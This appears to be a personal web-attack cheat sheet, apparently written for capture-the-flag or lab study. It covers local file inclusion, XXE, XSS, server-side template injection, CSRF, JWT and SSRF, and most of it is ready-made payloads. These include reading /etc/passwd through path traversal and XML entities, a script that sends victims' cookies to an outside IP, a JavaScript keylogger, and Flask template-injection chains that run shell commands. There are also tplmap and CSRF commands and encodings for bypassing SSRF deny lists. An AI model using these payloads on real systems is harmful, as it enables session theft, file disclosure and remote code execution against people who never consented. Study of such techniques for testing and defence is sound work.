### LFI (local file inclusion)

If you see a parameter you can try LFI on it.
```
http://127.0.0.1/?file=page.php
```
We can not try view a file on the system.
```
http://127.0.0.1/?file=../../../../../../etc/passwd
```

### XXE (XML External Entity)

This abuses features of XML parser/Data.

Let's look at the structure.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE file SYSTEM "file.dtd">
<file>
    <to>moon</to>
    <from>cake</from>
    <heading>food</heading>
    <body>XXE attack</body>
</file> 
```
XML document starts with 
```
<?xml version="1.0" encoding="UTF-8"?> 
```
The next part is called the DTD (Document Type Definition)
This defines the elements and attributes.

- !DOCTYPE note -  Defines a root element of the document named note
- !ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
- !ELEMENT to - Defines the to element to be of type "#PCDATA"
- !ELEMENT from - Defines the from element to be of type "#PCDATA"
- !ELEMENT heading  - Defines the heading element to be of type "#PCDATA"
- !ELEMENT body - Defines the body element to be of type "#PCDATA"

We can abuse this to read a file on a system.
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```
or change something
```
<!DOCTYPE replace [<!ENTITY food "cake"> ]>
 <foodInfo>
  <firstName>moon</firstName>
  <lastName>&food;</lastName>
 </foodInfo>
 ```
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<root><name>a</name><tel>a</tel><email>&xxe;</email><password>a</password></root>
```
 
 ### XSS (Cross-Site Scripting)
 
 Injection where an attacker can execute malicious scripts and execute on machine
 
 ```
 <script>alert(1)</script>
 <img src=1 onerror=alert(1)>
 ' onerror='alert(1)
 3'**alert());//
 javascript:alert(1)
 ```
 #### Stored-XSS
 
 See if we can add html tags
 
 <b>comment</b>
 
 See if we can get a popup
 ```
 <script>alert(XSS popup)</script>
 ```
 We can even get cookies or change element with javascript
 
 ```
 <script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
 <script>alert(document.cookie)</script>
 ```
 We can also steal cookies from other users.
 
 ```
 <script>window.location='http://192.168.1.10/?cookie='+document.cookie</script>
 ```
 
 ####  Reflected XSS
 Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.
 
 ```
 <script>alert("Hello")</script>
 <script>alert(window.location.hostname)</script>
 ```
 
 #### Stored XSS
 As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.
 
 #### DOM-Based XSS
DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source

 ```
 test" onmouseover="alert('test')
 test" onmouseover="document.body.style.backgroundColor='red'
 ```
#### Keylogger

```
 <script type="text/javascript">
 let l = ""; // Variable to store key-strokes in
 document.onkeypress = function (e) { // Event to listen for key presses
   l += e.key; // If user types, log it to the l variable
   console.log(l); // update this line to post to your own server
 }
</script> 
```
```
<img SRC="test" onmouseover=alert('Hello') />
<img SRC="test" onmouseover=confirm('Hello') />
<img SRC="test" onmouseover=alert('HHelloello') />
<img SRC="test" ONMOUSEOVER=alert('HHelloello') />
```


### SSTI (server side template injection)

flask for instance
```
check
{{2+2}}
LFI
{{ ''.__class__.__mro__[2].__subclasses__()[40]()(/etc/passwd).read()}}
RCE
{{config.__class__.__init__.__globals__['os'].popen(<command>).read()}}
```

```
{{ ''.__class__ }}
{{ ''.__class__.__mro__ }}
{{ ''.__class__.__mro__[1] }}
{{ ''.__class__.__mro__[1].__subclasses__() }}

find the index position of subprocess.Popen

{{ ''.__class__.__mro__[1].__subclasses__()[401] }}
{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}
```

https://github.com/swisskyrepo/PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection


https://github.com/epinna/tplmap
```
./tplmap.py -u http://10.10.10.10:5000/ -d 'noot' --os-cmd "cat/ etc/passwd"
```

### CSRF (Cross Site Request Forgery)

```
<img src="http://localhost:3000/transfer?to=alice&amount=100">
```
```
pip3 install xsrfprobe
xsrfprobe -u <url>/<endpoint>
```

### JWT (JSON Web Token)

```
"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
HEAD.PAYLOAD.SECRET
```
https://jwt.io/
https://www.base64url.com/
https://github.com/lmammino/jwt-cracker

### SSRF (Server Side Request Forgery)

Attackers can bypass a Deny List by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.
https://www.w3schools.com/tags/ref_urlencode.ASP


